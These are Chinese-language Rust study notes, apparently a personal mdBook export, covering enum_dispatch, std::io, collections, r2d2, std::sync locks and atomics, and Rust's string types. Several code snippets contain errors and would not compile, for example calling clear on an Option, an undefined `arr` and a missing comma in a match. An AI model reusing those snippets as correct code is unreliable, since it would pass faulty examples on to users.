<p>说了这么多，是为了引出主角<a href="https://docs.rs/enum_dispatch/latest/enum_dispatch/index.html"><code>enum_dispatch</code></a>。看看他如何解决这个问题。只用添加两个过程宏，就可以自动生成这些繁琐的模板代码。而且还会自动实现<code>From</code>。一共就这么多代码。</p>
<pre><pre class="playground"><code class="language-rust">use enum_dispatch::enum_dispatch;
#[enum_dispatch]
trait Voice {
    fn voice(&amp;self);
}
struct Cat;
impl Voice for Cat {
    fn voice(&amp;self) {
        println!(&quot;Meow&quot;);
    }
}
struct Cow;
impl Voice for Cow {
    fn voice(&amp;self) {
        println!(&quot;Moo&quot;);
    }
}

#[enum_dispatch(Voice)]
enum Animal {
    Cat_(Cat),
    Cow_(Cow),
}
fn hello(animal: &amp;Animal) {
    animal.voice();
}

fn main() {
    let cat = Animal::from(Cat {});
    let cow = Animal::from(Cow {});
    hello(&amp;cat);
    hello(&amp;cow);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="io-1"><a class="header" href="#io-1">IO</a></h1>
<p>我觉得Rust标准库对IO的抽象非常值得学习。当然其中的idea不一定是Rust首创的。</p>
<h2 id="readwrite-2"><a class="header" href="#readwrite-2">Read/Write</a></h2>
<p>这就是最简单的读/写的抽象了。读的意思是可以从中读取字节。</p>
<p><code>Read</code>里面有很多方法，不过都是有默认的实现的。自己要为对象实现<code>Read</code>，只需要实现<code>read</code></p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Read {
    fn read(&amp;mut self, buf: &amp;mut [u8]) -&gt; Result&lt;usize&gt;;
    ...
}
<span class="boring">}
</span></code></pre></pre>
<p><code>Write</code>类似。自己要为对象实现<code>Write</code>，需要实现<code>write</code>和<code>flush</code>，<code>flush</code>显然是为了buffer设计的，如果你不考虑效率的话也可以不缓冲直接写，给<code>flush</code>来个空操作。<strong>不过，操作系统很可能会对写进行缓冲，所以不是你自己不做缓冲就真的没有缓冲了，这个时候你还是需要正确的去进行flush操作</strong>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Write {
    fn write(&amp;mut self, buf: &amp;[u8]) -&gt; Result&lt;usize&gt;;
    fn flush(&amp;mut self) -&gt; Result&lt;()&gt;;
    ...
}
<span class="boring">}
</span></code></pre></pre>
<p>另外，记得这两个东西是Trait，在调用实现了<code>Read</code>/<code>Write</code>对象的相应方法的时候记得导入他们。</p>
<h2 id="stdinstdout"><a class="header" href="#stdinstdout">stdin/stdout</a></h2>
<p>最简单的输出办法就是<code>println!()</code>宏，特别适合在一些小程序中使用。但是要对标准输入输出做更精细的控制，应该用<code>Stdin</code>和<code>Stdout</code>。</p>
<h3 id="读入两行一"><a class="header" href="#读入两行一">读入两行（一）</a></h3>
<p>使用<code>stdin</code>可以获得标准输入的实例<code>Stdin</code>，这个结构本身已经实现了<code>Read</code>（更准确的说法是<a href="https://doc.rust-lang.org/std/io/trait.BufRead.html"><code>BufRead: Read</code></a>），所以可以直接在他上面调用各种读取方法，比如<code>read_line</code>。</p>
<pre><pre class="playground"><code class="language-rust">use std::io::{self, BufRead};
fn main() -&gt; Result&lt;(), io::Error&gt; {
    let mut buf = String::new();
    let stdin:Stdin = io::stdin();

    stdin.read_line(&amp;mut buf)?;
    println!(&quot;Read first line: {}&quot;, buf);
    buf.clear();
    stdin.read_line(&amp;mut buf)?;
    println!(&quot;Read second line: {}&quot;, buf);
    Ok(())
}

</code></pre></pre>
<h3 id="读入两行二"><a class="header" href="#读入两行二">读入两行（二）</a></h3>
<p>事实上，为了线程安全考虑，每次使用<code>Stdin::read_line()</code>以及其他各种读取办法的时候，内部都要上锁。为了提高效率，可以手动调用<code>lock</code>方法。</p>
<pre><pre class="playground"><code class="language-rust">use std::io::{self, BufRead};
fn main() -&gt; Result&lt;(), io::Error&gt; {
    let mut buf = String::new();
    let stdin = io::stdin();
    let mut stdinlock:StdinLock = stdin.lock();
    
    stdinlock.read_line(&amp;mut buf)?;
    println!(&quot;Read first line: {}&quot;, buf);
    buf.clear();
    stdinlock.read_line(&amp;mut buf)?;
    println!(&quot;Read second line: {}&quot;, buf);
    Ok(())
}
</code></pre></pre>
<h2 id="bufreaderbufwriter"><a class="header" href="#bufreaderbufwriter"><a href="https://doc.rust-lang.org/std/io/struct.BufReader.html">BufReader</a>/BufWriter</a></h2>
<p>直接的对一个实现了<code>Read</code>的对象进行读取操作、或对一个满足了<code>Write</code>的对象进行写入操作，是一个非常不高效的操作，当<strong>频繁的小规模的读写</strong>尤甚。而<code>BufReader</code>可以包裹任何实现了<code>Read</code>的对象，<code>BufWriter</code>可以包裹任何实现了<code>Write</code>的对象，他们都<strong>有一个在内存的Buffer，从而大大提高读写效率</strong>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct BufReader&lt;R&gt; {
    inner: R,
    buf: Box&lt;[u8]&gt;,
    pos: usize,
    cap: usize,
}
pub struct BufWriter&lt;W: Write&gt; {
    inner: W,
    // The buffer. Avoid using this like a normal `Vec` in common code paths.
    // That is, don't use `buf.push`, `buf.extend_from_slice`, or any other
    // methods that require bounds checking or the like. This makes an enormous
    // difference to performance (we may want to stop using a `Vec` entirely).
    buf: Vec&lt;u8&gt;,
    // #30888: If the inner writer panics in a call to write, we don't want to
    // write the buffered data a second time in BufWriter's destructor. This
    // flag tells the Drop impl if it should skip the flush.
    panicked: bool,
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="读入两行三"><a class="header" href="#读入两行三">读入两行（三）</a></h3>
<p>当然了，<code>BufReader</code>怎么可能没有实现<code>BufRead</code>呢。不过，<strong>下面的代码属于是多此一举了</strong>，因为<code>StdinLock</code>里面就有一个<code>BufReader</code>。单纯是为了展示功能，以后换一个合适的例子。</p>
<pre><pre class="playground"><code class="language-rust">use std::io::{self, BufRead, BufReader};
fn main() -&gt; Result&lt;(), io::Error&gt; {
    let mut buf = String::new();
    let stdin = io::stdin();
    let stdinlock = stdin.lock();
    let mut stdinbuf = BufReader::new(stdinlock);

    stdinbuf.read_line(&amp;mut buf)?;
    println!(&quot;Read first line: {}&quot;, buf);
    buf.clear();
    stdinbuf.read_line(&amp;mut buf)?;
    println!(&quot;Read second line: {}&quot;, buf);

    Ok(())
}
</code></pre></pre>
<h2 id="seek"><a class="header" href="#seek"><a href="https://doc.rust-lang.org/std/io/trait.Seek.html">Seek</a></a></h2>
<p><code>Seek</code>提供了一个可以在字节流中移动的cursor。我觉得，<code>Seek</code> + <code>Read</code> 对应Linux中的块设备，单纯的<code>Read</code>对应Linux中的字符设备。</p>
<p>类似的，自己要为对象实现<code>Seek</code>，只需要实现<code>seek</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Seek {
    fn seek(&amp;mut self, pos: SeekFrom) -&gt; Result&lt;u64&gt;;
    ...
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="容器的增删改查"><a class="header" href="#容器的增删改查">容器的增删改查</a></h1>
<p><img src="Language/Rust/Crate//Users/bytedance/Documents/note/Rust/images/image-20220804151758096.png" alt="图源 https://docs.google.com/presentation/d/1q-c7UAyrUlM-eZyTo1pd8SZ0qwA_wYxmPZVOQkoDmH4/edit#slide=id.p" /></p>
<p>Rust中的容器给我们的编程带来了很大的便利，但是每次都要查标准库有点麻烦，这里略加总结一下。另外，所有权真的是Rust中绕不过去的东西，“理解了所有权，就理解了Rust”。</p>
<p>线性表、映射、字符串是程序中最常用的三大数据结构。 </p>
<ul>
<li>增、删、改、查</li>
<li>创建、初始化</li>
<li>遍历（迭代）</li>
</ul>
<h2 id="数组"><a class="header" href="#数组"><a href="https://doc.rust-lang.org/std/primitive.array.html">数组</a></a></h2>
<p>Rust中的数组可以表示成<code>[T;N]</code>，N是一个要求在<strong>编译时</strong>确定的非负整数（也就是说不支持像C语言那样的动态长度数组，如果需要动态长度的话可以用Vector）。
数组元素实现了Copy Trait和没有实现Copy Trait在使用的时候差距还蛮大的。因为实现了Copy Trait在复制的时候所有权是不需要转移的。</p>
<h3 id="初始化"><a class="header" href="#初始化">初始化</a></h3>
<p>初始化有两种方法，</p>
<ol>
<li>A list with each element, i.e., <code>[x, y, z]</code>.</li>
<li>A repeat expression <code>[x; N]</code>, which produces an array with <code>N</code> copies of <code>x</code>. The type of <code>x</code> must be <a href="https://doc.rust-lang.org/std/marker/trait.Copy.html"><code>Copy</code></a>.</li>
</ol>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 注意这里的数组是i32类型的，实现了Copy
let mut arrcopy : [i32; 2] = [1;2];
let mut nocopy : [String; 2] = [&quot;1&quot;.to_string(),&quot;1&quot;.to_string()];

// 查
let c = arrcopy[0];		//数组可以直接使用下标，但是越界会Panic
// let c = nocopy[0];	//error，因为数组没有实现copy，应该用&amp;nocopy[0]
assert_eq!([1,1], &amp;arrcopy[1..]);	// slice

// 改
arrcopy[1] = 10;
nocopy[1] = &quot;10&quot;;
let c = &amp;mut arrcopy[1];	// 通过一个可变引用（指针）
*c = 110;
// assert_eq!([1,10,3,4,5], arr);	//error
drop(c);    // 如果不drop的话，arr存在一个mutable reference，后面无法使用
assert_eq!([1,110], arr);	

// 增删，长度是固定的，没法增删
<span class="boring">}
</span></code></pre></pre>
<h2 id="vec"><a class="header" href="#vec"><a href="https://doc.rust-lang.org/std/vec/struct.Vec.html">Vec</a></a></h2>
<p>有一个macro帮助我们创建并初始化：<code>let vec = vec![0; 5];</code> Vec在底层的实现和C++是类似的。有两种方法创建一个Vec</p>
<ol>
<li><code>  let mut v = Vec::&lt;i32&gt;::new();</code> 泛型的约束多半Rust可以通过上下文推导得出，不需要我们手动写。</li>
<li><code>let mut vec = Vec::with_capacity(5);</code> 预留空间，提高效率。</li>
</ol>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let mut stack = Vec::new();
// 增
stack.push(1);	
stack.append(&amp;mut vec![3,4,5]);	// 把另一个vec中的所有元素移过来
// 删
let x:Option&lt;i32&gt; = stack.pop();
x.clear();	// 清空
// 查
let x:i32 = stack[0];	// 下标越界会panic
let x:Option&lt;&amp;i32&gt; = stack.get(0);	// 安全
let x:Option&lt;&amp;mut i32&gt; = stack.get_mut(0);	// 安全
let x = stack.get_unchecked(0); // 这个和 &amp;stack[0] 貌似没什么区别
// 改 通过可变引用改咯

// 迭代
for i in v {}; for i in v.into_iter() {}; // 所有权都拿出来了
for i in &amp;v {}; for i in v.iter() {}; 	
for i in &amp;mut v{}; for i in v.iter_mut() {}; 
<span class="boring">}
</span></code></pre></pre>
<p>另一个有用的方法是sort</p>
<h2 id="hashmap"><a class="header" href="#hashmap"><a href="Language/Rust/Crate/">HashMap</a></a></h2>
<h2 id="hashset"><a class="header" href="#hashset"><a href="Language/Rust/Crate/">HashSet</a></a></h2>
<h2 id="string-和-str"><a class="header" href="#string-和-str">String 和 &amp;str</a></h2>
<p>Rust中的字符串主要是这两种形式，所以放在一起看待。不同于C语言中的字符串就是字符数组，在Rust中并不是这样的。Rust中的字符是Unicode字符，char类型占4个字节。String是UTF-8序列，是不定长的，所以也无法用index访问其中的字符。
正则表达式要用第三方库regex::Regex。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 查
let s = &quot;你好, 世界!&quot;;
assert_eq!(&quot;好, 世界!&quot;,s.get(3..).unwrap());
assert_eq!(None,s.get(1..));    // 从一个非法的地方截断
for i in s.chars() {};  // '你', '好', ',' ...  i:char
for i in s.bytes() {};  // i:bytes
assert_eq!(Some(3),s.find(&quot;好&quot;));
// contain 方法，判断字符串中是否存在符合指定条件的字符

// 改
let v: Vec&lt;&amp;str&gt; = s.split(&quot;,&quot;).collect();      //分割子串，得到迭代器
assert_eq!(vec![&quot;你好&quot;,&quot; 世界!&quot;],v);

// 修改字符串的内容，一般用String
// 增
let mut hello = String::from(&quot;你好&quot;);
hello.push_str(&quot; world&quot;);   // 在字符串末尾添加
println!(&quot;{}&quot;,hello);
hello.insert_str(6, &quot;啊&quot;);      //往字符串中间插入，注意得到的是 &quot;你好啊 world&quot;
println!(&quot;{}&quot;,hello);
// 改，由于不能索引，所以会比较麻烦
// 先转换成迭代器，再用map处理，然后collect回去。
let x:String = &quot;hello&quot;.to_string().chars().map(|x| (x as u8+1) as char).collect();
x.replace(&quot;mm&quot;,&quot;ll&quot;);   // 这个也是常用方法
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gtk-rs"><a class="header" href="#gtk-rs">gtk-rs</a></h1>
<p>作为一个喜欢Linux，C和Rust的人来说，也许对gtk这个GUI框架会更有好感吧。</p>
<p>并且，C和Rust是两个不支持继承的语言，而GTK是重度依赖继承的库，看看他们怎么模拟继承概念，也是一个蛮有意思的事情。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="r2d2"><a class="header" href="#r2d2">r2d2</a></h1>
<p>r2d2是一个通用的数据库连接池接口。</p>
<h2 id="数据库连接接口"><a class="header" href="#数据库连接接口">数据库连接接口</a></h2>
<p>为了给具体的数据库创建连接，可以去实现<code>ManageConnection</code>类，他提供了创建连接的抽象。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>/// A trait which provides connection-specific functionality.
pub trait ManageConnection: Send + Sync + 'static {
    /// The connection type this manager deals with.
    type Connection: Send + 'static;

    /// The error type returned by `Connection`s.
    type Error: error::Error + 'static;

    /// Attempts to create a new connection.
    fn connect(&amp;self) -&gt; Result&lt;Self::Connection, Self::Error&gt;;

    /// Determines if the connection is still connected to the database.
    ///
    /// A standard implementation would check if a simple query like `SELECT 1`
    /// succeeds.
    fn is_valid(&amp;self, conn: &amp;mut Self::Connection) -&gt; Result&lt;(), Self::Error&gt;;

    /// *Quickly* determines if the connection is no longer usable.
    ///
    /// This will be called synchronously every time a connection is returned
    /// to the pool, so it should *not* block. If it returns `true`, the
    /// connection will be discarded.
    ///
    /// For example, an implementation might check if the underlying TCP socket
    /// has disconnected. Implementations that do not support this kind of
    /// fast health check may simply return `false`.
    fn has_broken(&amp;self, conn: &amp;mut Self::Connection) -&gt; bool;
}

<span class="boring">}
</span></code></pre></pre>
<p>在这个的基础上，提供了很多hook点让我们自定义。</p>
<p>自定义<strong>错误处理</strong></p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;E&gt; HandleError&lt;E&gt; for NopErrorHandler {
    fn handle_error(&amp;self, _: E) {}
}
<span class="boring">}
</span></code></pre></pre>
<p>自定义<strong>连接前</strong>和<strong>释放后</strong></p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait CustomizeConnection&lt;C, E&gt;: fmt::Debug + Send + Sync + 'static {
    /// Called with connections immediately after they are returned from
    /// `ManageConnection::connect`.
    ///
    /// The default implementation simply returns `Ok(())`.
    ///
    /// # Errors
    ///
    /// If this method returns an error, the connection will be discarded.
    #[allow(unused_variables)]
    fn on_acquire(&amp;self, conn: &amp;mut C) -&gt; Result&lt;(), E&gt; {
        Ok(())
    }

    /// Called with connections when they are removed from the pool.
    ///
    /// The connections may be broken (as reported by `is_valid` or
    /// `has_broken`), or have simply timed out.
    ///
    /// The default implementation does nothing.
    #[allow(unused_variables)]
    fn on_release(&amp;self, conn: C) {}
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="连接池实现"><a class="header" href="#连接池实现">连接池实现</a></h2>
<p><code>Pool</code>实现了</p>
<h2 id="extension"><a class="header" href="#extension">Extension</a></h2>
<p>这个写法是有点花哨的。。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>/// A &quot;type map&quot; used to associate data with pooled connections.
///
/// `Extensions` is a data structure mapping types to a value of that type. This
/// can be used to, for example, cache prepared statements along side their
/// connection.
#[derive(Default)]
pub struct Extensions(HashMap&lt;TypeId, Box&lt;dyn Any + Sync + Send&gt;&gt;);
<span class="boring">}
</span></code></pre></pre>
<h2 id="config-1"><a class="header" href="#config-1">Config</a></h2>
<p>config用建造者模式，配置了一个<code>Pool</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stdsync"><a class="header" href="#stdsync">std::sync</a></h1>
<p>这个库提供了非常多的同步元语（也可以理解为提供了各种锁），帮助我们构建并发安全的应用。 </p>
<ul>
<li><code>parking_lot</code>是另一个提供了很多同步元语的库，有着比标准库更高的性能，并且提供的接口和标准库几乎一样。</li>
<li><code>tokio::sync</code>也提供了同步元语。</li>
</ul>
<h2 id="mutex-1"><a class="header" href="#mutex-1">Mutex</a></h2>
<p>互斥锁。用<code>lock()</code>获得锁。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::{Arc, Mutex};
use std::thread;

let mutex = Arc::new(Mutex::new(0));
let c_mutex = Arc::clone(&amp;mutex);

thread::spawn(move || {
    *c_mutex.lock().unwrap() = 10;
}).join().expect(&quot;thread::spawn failed&quot;);
assert_eq!(*mutex.lock().unwrap(), 10);
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>如果你觉得你的锁可能会中毒，那么也许需要对<code>lock</code>得到的结果做进一步的处理。详见锁中毒这一章节。</li>
<li>如果你不希望等待锁会阻塞你的线程，你可以使用<code>try_lock</code>，他们会立即返回。然后你可以切换到其他线程，或者进行其他操作。
<ul>
<li>tokio::sync提供的锁，可以让你更优雅的防止阻塞。他的<code>lock</code>是异步函数，直接一个<code>mutex.lock().await</code>。</li>
</ul>
</li>
</ul>
<h2 id="rwlock"><a class="header" href="#rwlock">RwLock</a></h2>
<p>读写锁。使用得当可以增加程序的并发性，提高效率（相对于互斥锁）。标准库提供的读写锁的优先级模式依赖于底层系统的实现。</p>
<blockquote>
<p>读写锁复习</p>
<ul>
<li>读锁之间不互斥，没有写锁的情况下，读锁是无阻塞的，多个协程可以同时获得读锁。</li>
<li>写锁之间是互斥的，存在写锁，其他写锁阻塞。</li>
<li>写锁与读锁是互斥的，如果存在读锁，写锁阻塞，如果存在写锁，读锁阻塞。</li>
</ul>
<p>读写锁可以有不同的操作模式优先级：</p>
<ul>
<li>读操作优先：允许最大并发，但写操作可能饿死。</li>
<li>写操作优先：一旦所有已经开始的读操作完成，等待的写操作立即获得锁。内部实现需要两把互斥锁。</li>
<li>未指定优先级</li>
</ul>
</blockquote>
<p>例子：用<code>read</code>获得读锁，<code>write</code>获得写锁。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let lock: RwLock&lt;i32&gt; = RwLock::new(1);
// 获取读锁
{
  let n1 = lock.read().unwrap();  
  let n2 = lock.read().unwrap();

  assert_eq!(*n1, 1);
  assert_eq!(*n2, 1);
}
// 获取写锁
let mut n = lock.write().unwrap();
*n += 2;
assert_eq!(*n, 3);
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>如果你觉得你的锁可能会中毒，那么也许需要对<code>read/write</code>得到的结果做进一步的处理。详见锁中毒这一章节。</li>
<li>如果你不希望等待锁会阻塞你的线程，你可以使用<code>try_read/try_write</code>，他们会立即返回。然后你可以切换到其他线程，或者进行其他操作。
<ul>
<li>tokio::sync提供的锁，可以让你更优雅的防止阻塞。他的<code>read/write</code>是异步函数，直接一个<code>lock.read().await</code>。tokio::sync</li>
</ul>
</li>
</ul>
<h2 id="锁中毒"><a class="header" href="#锁中毒">锁中毒</a></h2>
<p>如果其他持有锁的线程挂掉了，那么你再去试图获得锁就会中毒<a href="https://doc.rust-lang.org/std/sync/struct.PoisonError.html">PoisonError</a>。防止这个的<strong>最佳实践</strong>是最小化锁的作用域，及时的把锁释放。以链接给出的例子为例，我们给10和11行前后加上两个大括号，让锁及时释放。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::{Arc, Mutex};
use std::thread;

let mutex = Arc::new(Mutex::new(1));

// poison the mutex
let c_mutex = Arc::clone(&amp;mutex);
let _ = thread::spawn(move || {
    {
      let mut data = c_mutex.lock().unwrap();
      *data = 2;
    } // 或者显示的调用c_mutex.unlock()
    panic!();
}).join();

match mutex.lock() {
    Ok(data) =&gt; println!(&quot;get data: {data}&quot;)
    Err(p_err) =&gt; {
        let data = p_err.get_ref();
        println!(&quot;recovered: {data}&quot;);
    }
};
<span class="boring">}
</span></code></pre></pre>
<p>如何处理中毒？</p>
<ol>
<li>其实用<code>unwrap</code>或其他方式直接panic就是一个正确的处理方式，因为此时数据可能已经被污染了。</li>
<li>不过在实际的业务中你可能并不希望panic，那可以从得到的中毒中读出数据，需要注意的是，此时数据可能已经被污染了。</li>
<li>或者，使用<code>parking_lot</code>提供的锁元语，他不会中毒，而是在发生Panic的时候正常的释放锁。需要注意的是，此时数据可能已经被污染了。并不是说不中毒就是好事。</li>
</ol>
<h2 id="atomic-1"><a class="header" href="#atomic-1">Atomic</a></h2>
<p>如果你想锁住的内容只是一个小整数，那么Atomic非常合适。<code>load</code>加载内容，<code>store</code>存储内容，保证不会出现不一致的情况。</p>
<pre><pre class="playground"><code class="language-rust">#![allow(unused)]
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::{hint, thread};

fn main() {
    let spinlock = Arc::new(AtomicUsize::new(1));

    let spinlock_clone = Arc::clone(&amp;spinlock);
    let thread = thread::spawn(move|| {
        spinlock_clone.store(0, Ordering::SeqCst);
    });

    // Wait for the other thread to release the lock
    while spinlock.load(Ordering::SeqCst) != 0 {
        hint::spin_loop();
    }

    if let Err(panic) = thread.join() {
        println!(&quot;Thread had an error: {panic:?}&quot;);
    }
}
</code></pre></pre>
<h2 id="once"><a class="header" href="#once">Once</a></h2>
<p>让我们只对一个结构进行一次初始化。尤其是要和外部(比如ffi)打交道来进行初始化的时候很好用。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>static INIT: Once = Once::new();

// 给外部调用
fn get_cached_val() -&gt; usize {
  INIT.call_once(|| {
    init();  // 保证init函数只执行一次
  });
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="字符串字节流"><a class="header" href="#字符串字节流">字符串/字节流</a></h1>
<p>这里把字符串和字节流放在一起总结。</p>
<h2 id="各种类型的字符串"><a class="header" href="#各种类型的字符串">各种类型的字符串</a></h2>
<p>为了安全，字符串在Rust中是一个有点复杂的东西。</p>
<p><img src="Language/Rust/Crate/../images/string.drawio.svg" alt="" /></p>
<ul>
<li>
<p>由于<code>From</code>和<code>Into</code>是伴生的，所以这里不列出<code>into</code>方法。</p>
</li>
<li>
<p>红色表示可能出错，可能返回Result也可能返回Option，或者是unsafe的。如果名字带了uncheck就不会返回错误，但是你懂得，不check了，就unsafe了。</p>
</li>
<li>
<p>从右边到左边，都可以通过<code>to_owned()</code>方法，这个方法是<code> std::borrow::ToOwned</code>规定的，是通过Clone的方式实现的。</p>
</li>
<li>
<p>左到右的斜线省略了很多。如果说右边的垂直存在转换，那么左到右的斜线是肯定存在的。而且Rust的自动解引用机制让我们直接用一个<code>.</code>就可以完成。</p>
</li>
<li>
<p>Rust命名规范，应该使用带有以下前缀名称方法来进行特定类型转换：</p>
<div class="table-wrapper"><table><thead><tr><th>名称前缀</th><th>内存代价</th><th>所有权</th></tr></thead><tbody>
<tr><td><code>as_</code></td><td>无代价</td><td>borrowed -&gt; borrowed</td></tr>
<tr><td><code>to_</code></td><td>代价昂贵</td><td>borrowed -&gt; borrowed borrowed -&gt; owned (非 Copy 类型) owned -&gt; owned (Copy 类型)</td></tr>
<tr><td><code>into_</code></td><td>看情况</td><td>owned -&gt; owned (非 Copy 类型)</td></tr>
</tbody></table>
</div></li>
<li>
<p>转换成String/&amp;str需要检查是否是合法的UTF-8字符串，大都需要错误检查。</p>
</li>
<li>
<p>CStr到byte的方法是to，不过目前的实现是0开销的。</p>
</li>
<li>
<p>OsStr没有直接到<code>*const u8</code>的方法。不知道为什么，不过先转换成<code>&amp;[u8]</code>就可以了。</p>
</li>
<li>
<p>&amp;str转换成其他类型的胖指针是可以有零开销的办法的，但是没有直接的办法。只能先转成<code>&amp;[u8]</code>再转换成<code>&amp;CStr</code>或<code>&amp;OsStr</code>。</p>
</li>
<li>
<p>尽量不要把borrowed-&gt;borrowed的转换中间带上了owned，这个带来了额外的clone开销。对于这些字符串来说，本质上都是一堆byte，没有必要复制。</p>
</li>
</ul>
<h3 id="string-str"><a class="header" href="#string-str">String &amp;str</a></h3>
<p>String是一个容器，容器的内容是<strong>合法的UTF-8字符串</strong>。为了保证这个合法性，很多创建String的代价都是比较高并且<strong>可能失败</strong>的，因为需要合法性检查。</p>
<p>&amp;str是一个携带metadata的指针，携带的额外信息是<strong>合法UTF-8字符串</strong>的长度（所以创建&amp;str也是要检查并可能失败的）。不同于String，他没有对字符串内容的所有权。</p>
<p>String是没有办法直接用for循环遍历和用下标取字符的。如果需要遍历可以用<code>chars()</code>或者<code>bytes()</code>方法转换成迭代器。取下标的话，如果你能保证是ASCII不如转换成<code>&amp;[u8]</code>，如果不能的话取下标确实不是一件简单的事情，反正代价总是O(N)的，不如遍历。</p>
<h3 id="osstring-osstr"><a class="header" href="#osstring-osstr">OsString &amp;OsStr</a></h3>
<blockquote>
<p><a href="https://doc.rust-lang.org/std/ffi/struct.OsString.html"><code>OsString</code></a> and <a href="https://doc.rust-lang.org/std/ffi/struct.OsStr.html"><code>OsStr</code></a> are useful when you need to transfer strings to and from the operating system itself, or when capturing the output of external commands. Conversions between <a href="https://doc.rust-lang.org/std/ffi/struct.OsString.html"><code>OsString</code></a>, <a href="https://doc.rust-lang.org/std/ffi/struct.OsStr.html"><code>OsStr</code></a> and Rust strings work similarly to those for <a href="https://doc.rust-lang.org/std/ffi/struct.CString.html"><code>CString</code></a> and <a href="https://doc.rust-lang.org/std/ffi/struct.CStr.html"><code>CStr</code></a>.</p>
</blockquote>
<p>顾名思义，这个是系统专用的合法字符串。</p>
<ul>
<li>On Unix systems, strings are often arbitrary sequences of non-zero bytes, in many cases interpreted as UTF-8.</li>
<li>On Windows, strings are often arbitrary sequences of non-zero 16-bit values, interpreted as UTF-16 when it is valid to do so.</li>
</ul>
<p>因为行为和系统有关，所以有系统相关的Trait，比如<code>std::os::unix::ffi::OsStrExt</code>。</p>
<h3 id="pathbuf-path"><a class="header" href="#pathbuf-path">PathBuf &amp;Path</a></h3>
<p>看到上面那张图，PathBuf到OsStr是无代价转换，不难猜到PathBuf可能就是OsString的一个简单封装，果然。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct PathBuf {
    inner: OsString,
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="vecu8-u8"><a class="header" href="#vecu8-u8">Vec&lt;u8&gt; &amp;[u8]</a></h3>
<p>这个也是携带metadata的指针，携带的额外信息是<code>u8</code>串的长度。对于ASCII串，<code>&amp;[u8]</code>是一个不错的存储方式。</p>
<h3 id="cstring-cstr"><a class="header" href="#cstring-cstr">CString &amp;Cstr</a></h3>
<blockquote>
<p><a href="https://doc.rust-lang.org/std/ffi/struct.CString.html"><code>CString</code></a> and <a href="https://doc.rust-lang.org/std/ffi/struct.CStr.html"><code>CStr</code></a> are useful when you need to transfer UTF-8 strings to and from languages with a C ABI, like Python.</p>
</blockquote>
<p>顾名思义是和C接口交互的时候使用的类型，内容是以<code>\0</code>结尾的字节串。值得注意的是，在Rust中的字符串中间可能是有<code>\0</code>的，因为<code>\x00</code>也是合法的UTF-8字符。</p>
<h3 id="const-u8i8"><a class="header" href="#const-u8i8">*const u8/i8</a></h3>
<p>这个就是裸指针了。和C语言中的<code>unsigned char*</code>, <code>char *</code>是完全可以一一对应的。</p>
<hr />
<h2 id="智能指针-2"><a class="header" href="#智能指针-2">智能指针</a></h2>
<p>上面的标题中的两种类型：</p>
<ul>
<li>第一种都是容器，拥有对里面内容的所有权。里面的内容主要是字节串，还有其他的一些metadata，比如长度，容量。</li>
<li>第二种都是“智能指针”，携带metadata，比如长度。如果把<code>&amp;</code>去掉，对他们解引用（比如<code>str</code>），得到的类型是不满足<code>Sized</code>的。所以往往他们都是作为指针使用的。</li>
<li>所以他们真的是非常像的，难怪都放在一起讲。他们不同的地方就是<strong>有没有对指向数据的所有权</strong>了。</li>
</ul>
<p>看一段简单的Demo</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let mut s = String::from(&quot;Hello&quot;);
    s.push('c');
    let ps = s.as_str();
    unsafe {
        let (valps1,valps2) : (usize,usize) = std::mem::transmute(ps);
        let (vals1,vals2,vals3): (usize,usize,usize) = std::mem::transmute(s);
        println!(&quot;&amp;str 0x{:x} {}&quot;,valps1,valps2);
        println!(&quot;String 0x{:x} {} {}&quot;,vals1,vals2,vals3);
    }
}
</code></pre></pre>
<ul>
<li><code>&amp;str</code>: 指针+长度。</li>
<li><code>String</code>: 指针+容器容量+长度。String其实就是一个Vec。</li>
<li>关于这个问题，有一个<a href="https://docs.google.com/presentation/d/1q-c7UAyrUlM-eZyTo1pd8SZ0qwA_wYxmPZVOQkoDmH4/edit#slide=id.p">经典图示</a>。需要翻墙，所以也放在这里。</li>
</ul>
